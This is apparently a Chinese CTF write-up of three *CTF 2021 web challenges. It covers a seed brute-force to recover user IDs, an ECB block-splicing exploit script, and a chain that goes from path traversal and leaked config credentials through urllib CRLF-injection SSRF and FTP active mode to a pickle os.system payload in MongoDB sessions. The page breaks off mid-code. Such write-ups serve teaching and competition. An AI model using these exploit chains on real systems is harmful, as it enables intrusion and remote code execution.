<html><head></head><body><h2 id="oh-my-note">oh-my-note</h2><p>签到题，观察源码：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br/><span class="line">2</span><br/><span class="line">3</span><br/><span class="line">4</span><br/><span class="line">5</span><br/><span class="line">6</span><br/><span class="line">7</span><br/><span class="line">8</span><br/><span class="line">9</span><br/><span class="line">10</span><br/><span class="line">11</span><br/><span class="line">12</span><br/><span class="line">13</span><br/><span class="line">14</span><br/><span class="line">15</span><br/><span class="line">16</span><br/><span class="line">17</span><br/><span class="line">18</span><br/><span class="line">19</span><br/></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#39;/create_note&#39;</span>, methods=[<span class="string">&#39;GET&#39;</span>, <span class="string">&#39;POST&#39;</span>]</span>)</span></span><br/><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_note</span>():</span></span><br/><span class="line">    ...</span><br/><span class="line">        <span class="keyword">if</span> request.method == <span class="string">&#34;POST&#34;</span>:</span><br/><span class="line">            ...</span><br/><span class="line">            <span class="keyword">else</span>:</span><br/><span class="line">                timestamp = <span class="built_in">round</span>(time.time(), <span class="number">4</span>)</span><br/><span class="line">                random.seed(timestamp)</span><br/><span class="line">                user_id = get_random_id()</span><br/><span class="line">                ...</span><br/><span class="line">            timestamp = <span class="built_in">round</span>(time.time(), <span class="number">4</span>)</span><br/><span class="line">            post_at = datetime.datetime.fromtimestamp(timestamp, tz=datetime.timezone.utc).strftime(<span class="string">&#39;%Y-%m-%d %H:%M UTC&#39;</span>)</span><br/><span class="line">            random.seed(user_id + post_at)</span><br/><span class="line">            note_id = get_random_id()</span><br/><span class="line"></span><br/><span class="line">            note = Note(user_id=user_id, note_id=note_id,</span><br/><span class="line">                        title=title, text=text,</span><br/><span class="line">                        prv=prv, post_at=post_at)</span><br/><span class="line">    ...</span><br/></pre></td></tr></tbody></table></figure><p>不难发现可以根据文章发布的时间反推seed拿到对应用户的id</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br/><span class="line">2</span><br/><span class="line">3</span><br/><span class="line">4</span><br/><span class="line">5</span><br/><span class="line">6</span><br/><span class="line">7</span><br/><span class="line">8</span><br/><span class="line">9</span><br/><span class="line">10</span><br/><span class="line">11</span><br/><span class="line">12</span><br/><span class="line">13</span><br/><span class="line">14</span><br/><span class="line">15</span><br/><span class="line">16</span><br/><span class="line">17</span><br/><span class="line">18</span><br/><span class="line">19</span><br/><span class="line">20</span><br/><span class="line">21</span><br/><span class="line">22</span><br/><span class="line">23</span><br/></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br/><span class="line"><span class="keyword">import</span> string</span><br/><span class="line"><span class="keyword">import</span> datetime</span><br/><span class="line">ts = <span class="number">1610677740</span></span><br/><span class="line">te = <span class="number">1610677800</span></span><br/><span class="line">target = <span class="string">&#39;lj40n2p9qj9xkzy3zfzz7pucm6dmjg1u&#39;</span></span><br/><span class="line"></span><br/><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_random_id</span>():</span></span><br/><span class="line">    alphabet = <span class="built_in">list</span>(string.ascii_lowercase + string.digits)</span><br/><span class="line">    <span class="keyword">return</span> <span class="string">&#39;&#39;</span>.join([random.choice(alphabet) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)])</span><br/><span class="line"></span><br/><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(ts, te):</span><br/><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9999</span>):</span><br/><span class="line">        timestamp = <span class="number">0.0001</span> * i + t</span><br/><span class="line">        random.seed(timestamp)</span><br/><span class="line">        user = get_random_id()</span><br/><span class="line">        time = datetime.datetime.fromtimestamp(</span><br/><span class="line">            t, tz=datetime.timezone.utc</span><br/><span class="line">        ).strftime(<span class="string">&#39;%Y-%m-%d %H:%M UTC&#39;</span>)</span><br/><span class="line">        random.seed(user + time)</span><br/><span class="line">        post = get_random_id()</span><br/><span class="line">        <span class="keyword">if</span> post == target:</span><br/><span class="line">            <span class="built_in">print</span>(timestamp, user)</span><br/></pre></td></tr></tbody></table></figure><blockquote><p>然而比赛的时候作为一个星 际 人，发生了这样的事情：</p></blockquote><img src="https://blog.frankli.site/2021/01/18/Security/Writeup/*CTF-2021-Web/chat.png" class="" title="星 际"/><p>而后<code>/my_notes</code>路由只要利用<code>user_id</code>就能列出用户的所有文章</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br/><span class="line">2</span><br/><span class="line">3</span><br/><span class="line">4</span><br/><span class="line">5</span><br/><span class="line">6</span><br/><span class="line">7</span><br/><span class="line">8</span><br/><span class="line">9</span><br/></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#39;/my_notes&#39;</span></span>)</span></span><br/><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_notes</span>():</span></span><br/><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#39;username&#39;</span>):</span><br/><span class="line">        username = session[<span class="string">&#39;username&#39;</span>]</span><br/><span class="line">        user_id = User.query.filter_by(username=username).first().user_id</span><br/><span class="line">    <span class="keyword">else</span>:</span><br/><span class="line">        user_id = request.args.get(<span class="string">&#39;user_id&#39;</span>)</span><br/><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> user_id:</span><br/><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#39;index&#39;</span>))</span><br/></pre></td></tr></tbody></table></figure><p>看到flag所在文章</p><img src="https://blog.frankli.site/2021/01/18/Security/Writeup/*CTF-2021-Web/secret.png" class="" title="flag"/><h2 id="lottery-again">lottery again</h2><p>题目是用的是ECB，cut and paste again。<br/>经过尝试，题目所用加密方式块大小为32，将随意一个明文可以如下拆分：</p><figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br/><span class="line">2</span><br/><span class="line">3</span><br/><span class="line">4</span><br/></pre></td><td class="code"><pre><span class="line">{<span class="attr">&#34;lottery&#34;</span>:<span class="string">&#34;cf4cfb25-8168-49db-a</span></span><br/><span class="line"><span class="string">32f-4bf80e5bc785&#34;</span>,<span class="attr">&#34;user&#34;</span>:<span class="string">&#34;b61740</span></span><br/><span class="line"><span class="string">52-f23a-4dbf-937d-fed3288b8de3&#34;</span>,</span><br/><span class="line"><span class="attr">&#34;coin&#34;</span>:<span class="number">1</span>}</span><br/></pre></td></tr></tbody></table></figure><p>好像没什么下手的地方？这时注意到php处理array的一个特性：当有重复键值时，取后扫描到的键值的值</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br/><span class="line">2</span><br/><span class="line">3</span><br/><span class="line">4</span><br/><span class="line">5</span><br/><span class="line">6</span><br/><span class="line">7</span><br/></pre></td><td class="code"><pre><span class="line">var_dump([<span class="string">&#39;a&#39;</span>=&gt;<span class="number">1</span>,<span class="string">&#39;a&#39;</span>=&gt;<span class="number">2</span>]);</span><br/><span class="line"></span><br/><span class="line"><span class="comment">// output:</span></span><br/><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) {</span><br/><span class="line">  [<span class="string">&#34;a&#34;</span>]=&gt;</span><br/><span class="line">  <span class="keyword">int</span>(<span class="number">2</span>)</span><br/><span class="line">}</span><br/></pre></td></tr></tbody></table></figure><p>回到题目。这类题目一般的思路为：用很多账户购买lottery（或者直接伪造，当然这道题不行，因为要和数据库内的lottery id交叉比对），并用一个账户充值，购买flag。也就是说，加入我们现在有两个lottery，我们需要将其中一个lottery的user段替换成另一个lottery中的user。<br/>结合php array特性，我们可以将</p><table><thead><tr><th style="text-align:left">Lottery 1</th><th style="text-align:left">Lottery 2</th></tr></thead><tbody><tr><td style="text-align:left">{“lottery”:“cf4cfb25-8168-49db-a<br/>32f-4bf80e5bc785”,“user”:“aaaaaa<br/>aa-aaaa-aaaa-aaaa-aaaaaaaaaaaa”,<br/>“coin”:1}</td><td style="text-align:left">{“lottery”:“fbdcf544-07d3-422e-8<br/>40b-d62a90c9332e”,“user”:“bbbbbb<br/>bb-bbbb-bbbb-bbbb-bbbbbbbbbbbb”,<br/>“coin”:2}</td></tr></tbody></table><p>Lottery 1的第三个块替换为Lottery 2的第二、第三块：</p><figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br/><span class="line">2</span><br/><span class="line">3</span><br/><span class="line">4</span><br/><span class="line">5</span><br/></pre></td><td class="code"><pre><span class="line">{<span class="attr">&#34;lottery&#34;</span>:<span class="string">&#34;cf4cfb25-8168-49db-a</span></span><br/><span class="line"><span class="string">32f-4bf80e5bc785&#34;</span>,<span class="attr">&#34;user&#34;</span>:<span class="string">&#34;aaaaaa</span></span><br/><span class="line"><span class="string">40b-d62a90c9332e&#34;</span>,<span class="attr">&#34;user&#34;</span>:<span class="string">&#34;bbbbbb</span></span><br/><span class="line"><span class="string">bb-bbbb-bbbb-bbbb-bbbbbbbbbbbb&#34;</span>,</span><br/><span class="line"><span class="attr">&#34;coin&#34;</span>:<span class="number">1</span>}</span><br/></pre></td></tr></tbody></table></figure><p>妙啊</p><div class="spoiler collapsed">    <div class="spoiler-title">        完整exploit    </div>    <div class="spoiler-content">        <figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br/><span class="line">2</span><br/><span class="line">3</span><br/><span class="line">4</span><br/><span class="line">5</span><br/><span class="line">6</span><br/><span class="line">7</span><br/><span class="line">8</span><br/><span class="line">9</span><br/><span class="line">10</span><br/><span class="line">11</span><br/><span class="line">12</span><br/><span class="line">13</span><br/><span class="line">14</span><br/><span class="line">15</span><br/><span class="line">16</span><br/><span class="line">17</span><br/><span class="line">18</span><br/><span class="line">19</span><br/><span class="line">20</span><br/><span class="line">21</span><br/><span class="line">22</span><br/><span class="line">23</span><br/><span class="line">24</span><br/><span class="line">25</span><br/><span class="line">26</span><br/><span class="line">27</span><br/><span class="line">28</span><br/><span class="line">29</span><br/><span class="line">30</span><br/><span class="line">31</span><br/><span class="line">32</span><br/><span class="line">33</span><br/><span class="line">34</span><br/><span class="line">35</span><br/><span class="line">36</span><br/><span class="line">37</span><br/><span class="line">38</span><br/><span class="line">39</span><br/><span class="line">40</span><br/><span class="line">41</span><br/><span class="line">42</span><br/><span class="line">43</span><br/><span class="line">44</span><br/><span class="line">45</span><br/><span class="line">46</span><br/><span class="line">47</span><br/><span class="line">48</span><br/><span class="line">49</span><br/><span class="line">50</span><br/><span class="line">51</span><br/><span class="line">52</span><br/><span class="line">53</span><br/><span class="line">54</span><br/><span class="line">55</span><br/><span class="line">56</span><br/></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> session</span><br/><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br/><span class="line"></span><br/><span class="line"><span class="keyword">import</span> string</span><br/><span class="line"><span class="keyword">import</span> random</span><br/><span class="line"></span><br/><span class="line">ses = session()</span><br/><span class="line"></span><br/><span class="line"></span><br/><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_random_id</span>():</span></span><br/><span class="line">    alphabet = <span class="built_in">list</span>(string.ascii_lowercase + string.digits)</span><br/><span class="line">    <span class="keyword">return</span> <span class="string">&#39;&#39;</span>.join([random.choice(alphabet) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)])</span><br/><span class="line"></span><br/><span class="line"></span><br/><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_user</span>():</span></span><br/><span class="line">    usernm, passwd = get_random_id(), get_random_id()</span><br/><span class="line">    ses.post(<span class="string">&#39;http://52.149.144.45:8080/user/register&#39;</span>, data={</span><br/><span class="line">        <span class="string">&#39;username&#39;</span>: usernm, <span class="string">&#39;password&#39;</span>: passwd,</span><br/><span class="line">    }).json()[<span class="string">&#39;user&#39;</span>]</span><br/><span class="line">    user = ses.post(<span class="string">&#39;http://52.149.144.45:8080/user/login&#39;</span>, data={</span><br/><span class="line">        <span class="string">&#39;username&#39;</span>: usernm, <span class="string">&#39;password&#39;</span>: passwd,</span><br/><span class="line">    }).json()[<span class="string">&#39;user&#39;</span>]</span><br/><span class="line">    <span class="keyword">return</span> user</span><br/><span class="line"></span><br/><span class="line"></span><br/><span class="line">flag_user = get_user()</span><br/><span class="line"><span class="built_in">print</span>(flag_user)</span><br/><span class="line">price = ses.post(<span class="string">&#39;http://52.149.144.45:8080/lottery/buy&#39;</span>, data={</span><br/><span class="line">    <span class="string">&#39;api_token&#39;</span>: flag_user[<span class="string">&#39;api_token&#39;</span>]</span><br/><span class="line">}).json()[<span class="string">&#39;enc&#39;</span>]</span><br/><span class="line"></span><br/><span class="line">amount = <span class="number">0</span></span><br/><span class="line"><span class="keyword">while</span> amount &lt; <span class="number">9999</span>:</span><br/><span class="line">    fake_user = get_user()</span><br/><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br/><span class="line">        sheep = ses.post(<span class="string">&#39;http://52.149.144.45:8080/lottery/buy&#39;</span>, data={</span><br/><span class="line">            <span class="string">&#39;api_token&#39;</span>: fake_user[<span class="string">&#39;api_token&#39;</span>]</span><br/><span class="line">        }).json()[<span class="string">&#39;enc&#39;</span>]</span><br/><span class="line">        treasure = b64decode(sheep)[:<span class="number">64</span>] + \</span><br/><span class="line">            b64decode(price)[<span class="number">32</span>:<span class="number">96</span>] + \</span><br/><span class="line">            b64decode(sheep)[<span class="number">96</span>:]</span><br/><span class="line">        treasure = b64encode(treasure).decode()</span><br/><span class="line">        coin = ses.post(<span class="string">&#39;http://52.149.144.45:8080/lottery/info&#39;</span>, data={</span><br/><span class="line">            <span class="string">&#39;enc&#39;</span>: treasure</span><br/><span class="line">        }).json()[<span class="string">&#39;info&#39;</span>][<span class="string">&#39;coin&#39;</span>]</span><br/><span class="line">        amount += coin</span><br/><span class="line">        ses.post(<span class="string">&#39;http://52.149.144.45:8080/lottery/charge&#39;</span>, data={</span><br/><span class="line">            <span class="string">&#39;user&#39;</span>: flag_user[<span class="string">&#39;uuid&#39;</span>],</span><br/><span class="line">            <span class="string">&#39;coin&#39;</span>: coin,</span><br/><span class="line">            <span class="string">&#39;enc&#39;</span>: treasure</span><br/><span class="line">        })</span><br/><span class="line">        <span class="built_in">print</span>(amount)</span><br/><span class="line"></span><br/><span class="line">ses.post(<span class="string">&#39;http://52.149.144.45:8080/flag&#39;</span>, data={</span><br/><span class="line">    <span class="string">&#39;api_token&#39;</span>: flag_user[<span class="string">&#39;api_token&#39;</span>]</span><br/><span class="line">})</span><br/></pre></td></tr></tbody></table></figure>    </div></div><h2 id="oh-my-bet">oh-my-bet</h2><p>上来就是个注册页面，然而头像的选择实现得很怪，提交的表单中是<code>1.png</code>这样的文件名一样的东西，尝试目录穿越，发现确实可以读到<code>/etc/passwd</code><br/>遂尝试读<code>/proc/self/cmdline</code>等，获取到源码，顺藤摸瓜看到<code>/app/utils.py</code>与<code>/app/config.py</code></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br/><span class="line">2</span><br/><span class="line">3</span><br/><span class="line">4</span><br/><span class="line">5</span><br/><span class="line">6</span><br/><span class="line">7</span><br/><span class="line">8</span><br/><span class="line">9</span><br/><span class="line">10</span><br/><span class="line">11</span><br/><span class="line">12</span><br/><span class="line">13</span><br/><span class="line">14</span><br/><span class="line">15</span><br/><span class="line">16</span><br/><span class="line">17</span><br/></pre></td><td class="code"><pre><span class="line"><span class="comment"># utils.py</span></span><br/><span class="line">...</span><br/><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_avatar</span>(<span class="params">username</span>):</span></span><br/><span class="line">    dirpath = os.path.dirname(__file__)</span><br/><span class="line">    user = User.query.filter_by(username=username).first()</span><br/><span class="line">    avatar = user.avatar</span><br/><span class="line">    <span class="keyword">if</span> re.match(<span class="string">&#39;.+:.+&#39;</span>, avatar):</span><br/><span class="line">        path = avatar</span><br/><span class="line">    <span class="keyword">else</span>:</span><br/><span class="line">        path = <span class="string">&#39;/&#39;</span>.join([<span class="string">&#39;file:/&#39;</span>, dirpath, <span class="string">&#39;static&#39;</span>, <span class="string">&#39;img&#39;</span>, <span class="string">&#39;avatar&#39;</span>, avatar])</span><br/><span class="line">    <span class="keyword">try</span>:</span><br/><span class="line">        content = base64.b64encode(urllib.request.urlopen(path).read())</span><br/><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br/><span class="line">        error_path = <span class="string">&#39;/&#39;</span>.join([<span class="string">&#39;file:/&#39;</span>, dirpath, <span class="string">&#39;static&#39;</span>, <span class="string">&#39;img&#39;</span>, <span class="string">&#39;avatar&#39;</span>, <span class="string">&#39;error.png&#39;</span>])</span><br/><span class="line">        content = base64.b64encode(urllib.request.urlopen(error_path).read())</span><br/><span class="line">        <span class="built_in">print</span>(e)</span><br/><span class="line">    <span class="keyword">return</span> content</span><br/></pre></td></tr></tbody></table></figure><p><code>utils.py</code>告诉我们用户头像是访问注册时提交的链接得到的，之后会缓存于redis中。观察可得此处的头像获取是个<code>urllib</code>任意协议ssrf</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br/><span class="line">2</span><br/><span class="line">3</span><br/><span class="line">4</span><br/><span class="line">5</span><br/><span class="line">6</span><br/><span class="line">7</span><br/><span class="line">8</span><br/><span class="line">9</span><br/><span class="line">10</span><br/><span class="line">11</span><br/><span class="line">12</span><br/><span class="line">13</span><br/></pre></td><td class="code"><pre><span class="line"><span class="comment"># config.py</span></span><br/><span class="line">...</span><br/><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ftp_login</span>(<span class="params">self</span>):</span></span><br/><span class="line">        ftp = FTP()</span><br/><span class="line">        ftp.connect(<span class="string">&#34;172.20.0.2&#34;</span>, <span class="number">8877</span>)</span><br/><span class="line">        ftp.login(<span class="string">&#34;fan&#34;</span>, <span class="string">&#34;root&#34;</span>)</span><br/><span class="line">        <span class="keyword">return</span> ftp</span><br/><span class="line">...</span><br/><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_config</span>(<span class="params">self</span>):</span></span><br/><span class="line">        f = self.ftp_login()</span><br/><span class="line">        f.cwd(<span class="string">&#34;files&#34;</span>)</span><br/><span class="line">        buf_size = <span class="number">1024</span></span><br/><span class="line">        f.retrbinary(<span class="string">&#39;RETR {}&#39;</span>.<span class="built_in">format</span>(<span class="string">&#39;config.json&#39;</span>), self.callback, buf_size)</span><br/></pre></td></tr></tbody></table></figure><p><code>config.py</code>又告诉我们flask启动时的环境变量位于<code>172.20.0.2</code>的ftp服务器中。利用上面的ssrf来取得config.json：</p><figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br/><span class="line">2</span><br/><span class="line">3</span><br/><span class="line">4</span><br/><span class="line">5</span><br/><span class="line">6</span><br/><span class="line">7</span><br/><span class="line">8</span><br/><span class="line">9</span><br/><span class="line">10</span><br/><span class="line">11</span><br/><span class="line">12</span><br/><span class="line">13</span><br/><span class="line">14</span><br/><span class="line">15</span><br/></pre></td><td class="code"><pre><span class="line">{</span><br/><span class="line">    <span class="attr">&#34;secret_key&#34;</span>: <span class="string">&#34;f4545478ee86$%^&amp;&amp;%$#&#34;</span>,</span><br/><span class="line">    <span class="attr">&#34;DEBUG&#34;</span>: <span class="literal">false</span>,</span><br/><span class="line">    <span class="attr">&#34;SESSION_TYPE&#34;</span>: <span class="string">&#34;mongodb&#34;</span>,</span><br/><span class="line">    <span class="attr">&#34;REMOTE_MONGO_IP&#34;</span>: <span class="string">&#34;172.20.0.5&#34;</span>,</span><br/><span class="line">    <span class="attr">&#34;REMOTE_MONGO_PORT&#34;</span>: <span class="number">27017</span>,</span><br/><span class="line">    <span class="attr">&#34;SESSION_MONGODB_DB&#34;</span>: <span class="string">&#34;admin&#34;</span>,</span><br/><span class="line">    <span class="attr">&#34;SESSION_MONGODB_COLLECT&#34;</span>: <span class="string">&#34;sessions&#34;</span>,</span><br/><span class="line">    <span class="attr">&#34;SESSION_PERMANENT&#34;</span>: <span class="literal">true</span>,</span><br/><span class="line">    <span class="attr">&#34;SESSION_USE_SIGNER&#34;</span>: <span class="literal">false</span>,</span><br/><span class="line">    <span class="attr">&#34;SESSION_KEY_PREFIX&#34;</span>: <span class="string">&#34;session:&#34;</span>,</span><br/><span class="line">    <span class="attr">&#34;SQLALCHEMY_DATABASE_URI&#34;</span>: <span class="string">&#34;mysql+pymysql://root:starctf123456@172.20.0.3:3306/ctf?charset=utf8&#34;</span>,</span><br/><span class="line">    <span class="attr">&#34;SQLALCHEMY_TRACK_MODIFICATIONS&#34;</span>: <span class="literal">true</span>,</span><br/><span class="line">    <span class="attr">&#34;REDIS_URL&#34;</span>: <span class="string">&#34;redis://@172.20.0.4:6379/0&#34;</span></span><br/><span class="line">}</span><br/></pre></td></tr></tbody></table></figure><p>此时我们发现内网有<code>172.20.0.0/29</code>共五台服务器（1为宿主机，不计）<br/>mysql估计是出题人想用来存payload审payload的，没啥用，hint也说了不要管redis，重点在于mongodb中存储了session对象。<br/>题目用到了<code>flask_session</code>，而<code>flask_session</code>使用的serializer默认是pickle（貌似现在也不支持改），也就是说只要能将恶意pickle数据塞到mongodb里就可以了</p><p>经尝试，利用<code>ftp://fan:root@172.20.0.2/</code>这样的url可以列出ftp服务器内的文件，下载<code>ftp-server.py</code><br/>首先看权限：<code>authorizer.add_user(&#34;fan&#34;, &#34;root&#34;, &#34;.&#34;, perm=&#34;elrafmwMT&#34;)</code>，有权限写</p><p>urllib这个ssrf还能怎么样进一步利用呢？略作百(gu)度(ge)可以找到<a href="https://bugs.python.org/issue36276">这个CVE</a><br/>不出意料，urllib在题目环境的版本中存在CRLF注入，我们可以在url的任意一个part注入换行符。这样，我们就可以完整地控制ftp客户端的行为了。</p><p>参考<a href="http://blog.zeddyu.info/2020/04/20/Plaid-CTF-2020-Web-1/">这篇文章</a>，我们发现ftp竟然还有主动模式这一说。<br/>plaid里的这道题利用ftp主动模式可以将ftp服务器内可控的二进制文件发送到任意ip的任意端口，对这道题来说问题就在于如何控制ftp服务器里的文件。<br/>经尝试（其实也能搜到），主动模式不仅可以用于文件的下载，还可以用于文件的上传。也就是说只要指示ftp服务器到我们自己的服务器来下载文件就好了。</p><p>此时，我们成功地将CRLF注入型SSRF提升为了完整的无状态二进制流SSRF（自己瞎起的名字），类似gopher</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br/><span class="line">2</span><br/><span class="line">3</span><br/><span class="line">4</span><br/><span class="line">5</span><br/><span class="line">6</span><br/><span class="line">7</span><br/><span class="line">8</span><br/><span class="line">9</span><br/><span class="line">10</span><br/><span class="line">11</span><br/><span class="line">12</span><br/><span class="line">13</span><br/><span class="line">14</span><br/><span class="line">15</span><br/><span class="line">16</span><br/><span class="line">17</span><br/><span class="line">18</span><br/><span class="line">19</span><br/><span class="line">20</span><br/><span class="line">21</span><br/><span class="line">22</span><br/><span class="line">23</span><br/><span class="line">24</span><br/><span class="line">25</span><br/><span class="line">26</span><br/><span class="line">27</span><br/><span class="line">28</span><br/><span class="line">29</span><br/></pre></td><td class="code"><pre><span class="line">bind = <span class="string">&#39;自己的IP:端口&#39;</span></span><br/><span class="line">targ = <span class="string">&#39;SSRF的目标IP:端口&#39;</span></span><br/><span class="line"></span><br/><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_port_cmd</span>(<span class="params">host</span>):</span></span><br/><span class="line">    host, port = host.split(<span class="string">&#39;:&#39;</span>)</span><br/><span class="line">    port = <span class="built_in">int</span>(port)</span><br/><span class="line">    <span class="keyword">return</span> <span class="string">&#39;PORT &#39;</span> + <span class="string">&#39;,&#39;</span>.join(host.split(<span class="string">&#39;.&#39;</span>) + [<span class="built_in">str</span>(port // <span class="number">256</span>), <span class="built_in">str</span>(port - port // <span class="number">256</span> * <span class="number">256</span>)])</span><br/><span class="line"></span><br/><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inject</span>(<span class="params">cmd</span>):</span></span><br/><span class="line">    cmd = <span class="string">&#39;\r\n&#39;</span>.join(cmd)</span><br/><span class="line">    <span class="keyword">return</span> ssrf(<span class="string">f&#39;&#39;&#39;ftp://fan:root<span class="subst">{cmd}</span>@<span class="subst">{ftpd}</span>/&#39;&#39;&#39;</span>)</span><br/><span class="line"></span><br/><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendfile</span>(<span class="params">file</span>):</span></span><br/><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br/><span class="line">    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br/><span class="line">    sock.bind((<span class="string">&#39;0.0.0.0&#39;</span>, <span class="built_in">int</span>(bind.split(<span class="string">&#39;:&#39;</span>)[<span class="number">1</span>])))</span><br/><span class="line">    sock.listen(<span class="number">1</span>)</span><br/><span class="line">    (client, address) = sock.accept()</span><br/><span class="line">    <span class="built_in">print</span>(<span class="string">&#39;accepted&#39;</span>, address)</span><br/><span class="line">    client.send(file)</span><br/><span class="line">    <span class="built_in">print</span>(<span class="string">&#39;sent&#39;</span>)</span><br/><span class="line">    client.close()</span><br/><span class="line"></span><br/><span class="line">thread = threading.Thread(target=sendfile, args=(request,))</span><br/><span class="line">thread.start()</span><br/><span class="line">inject([<span class="string">&#39;TYPE I&#39;</span>, get_port_cmd(bind), <span class="string">&#39;STOR frankli&#39;</span>])</span><br/><span class="line">thread.join()</span><br/><span class="line"><span class="built_in">print</span>(<span class="string">&#39;replaying&#39;</span>)</span><br/><span class="line">inject([<span class="string">&#39;TYPE I&#39;</span>, get_port_cmd(targ), <span class="string">&#39;RETR frankli&#39;</span>])</span><br/></pre></td></tr></tbody></table></figure><p>接下来的任务就是向mongodb发起一个update请求，修改数据库里的session序列化数据。如何构造这个数据包呢，我赛后问了出题人和别的队伍的同学，基本有下面几种：</p><ol><li>分析mongodb数据包，并手动构造（肝败吓疯）</li><li>查<a href="https://docs.mongodb.com/manual/reference/mongodb-wire-protocol/">文档</a>，手动构造</li><li>抓包重放（出题人）</li><li>我的办法</li></ol><p>我的办法比较脏，但是也比较好玩。众所周知python啥都能干，比如pymongo。然而pymongo是主动去连服务器的，怎么获取到数据包本身呢？<br/>改代码呗，去<code>site-packages/pymongo/network.py:142</code>，在sendall之前丢  个  异  常</p><img src="https://blog.frankli.site/2021/01/18/Security/Writeup/*CTF-2021-Web/exception.png" class="" title="我看是你脑子有异常"/><p>然后就可以愉快地拿到mongo请求了。<br/>只是有一点要注意，下面这个脚本跑的时候在localhost也得启动一个mongo实例/docker，不然pymongo发别的ping包之类的会阻塞。</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br/><span class="line">2</span><br/><span class="line">3</span><br/><span class="line">4</span><br/><span class="line">5</span><br/><span class="line">6</span><br/><span class="line">7</span><br/><span class="line">8</span><br/><span class="line">9</span><br/><span class="line">10</span><br/><span class="line">11</span><br/><span class="line">12</span><br/><span class="line">13</span><br/><span class="line">14</span><br/><span class="line">15</span><br/><span class="line">16</span><br/><span class="line">17</span><br/><span class="line">18</span><br/><span class="line">19</span><br/><span class="line">20</span><br/><span class="line">21</span><br/><span class="line">22</span><br/><span class="line">23</span><br/><span class="line">24</span><br/></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pymongo <span class="keyword">import</span> MongoClient</span><br/><span class="line"><span class="keyword">import</span> pickle</span><br/><span class="line"><span class="keyword">import</span> os</span><br/><span class="line"></span><br/><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pickle</span>(<span class="params">cmd</span>):</span></span><br/><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">exp</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br/><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br/><span class="line">            <span class="keyword">return</span> (os.system, (cmd,))</span><br/><span class="line">    <span class="keyword">return</span> pickle.dumps(exp())</span><br/><span class="line"></span><br/><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mongo</span>(<span class="params">cmd</span>):</span></span><br/><span class="line">    client = MongoClient(<span class="string">&#39;localhost&#39;</span>, <span class="number">27017</span>)</span><br/><span class="line">    coll = client.admin.sessions</span><br/><span class="line">    <span class="keyword">try</span>:</span><br/><span class="line">        coll.update_one(</span><br/><span class="line">            {<span class="string">&#39;id&#39;</span>:<span class="string">&#39;session:37386ce1-3fe8-4f1d-91fc-224581c5279f&#39;</span>},</span><br/><span class="line">            {<span class="string">&#34;$set&#34;</span>: { <span class="string">&#34;val&#34;</span>: get_pickle(cmd) }},</span><br/><span class="line">            upsert=<span class="literal">True</span></span><br/><span class="line">        )</span><br/><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br/><span class="line">        <span class="keyword">return</span> e.message</span><br/><span class="line"></span><br/><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#39;__main__&#39;</span>:</span><br/><span class="line">    <span class="built_in">print</span>(get_mongo(<span class="string">&#39;ls&#39;</span>))</span><br/></pre></td></tr></tbody></table></figure><div class="spoiler collapsed">    <div class="spoiler-title">        剩下的exploit    </div>    <div class="spoiler-content">        <figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br/><span class="line">2</span><br/><span class="line">3</span><br/><span class="line">4</span><br/><span class="line">5</span><br/><span class="line">6</span><br/><span class="line">7</span><br/><span class="line">8</span><br/><span class="line">9</span><br/><span 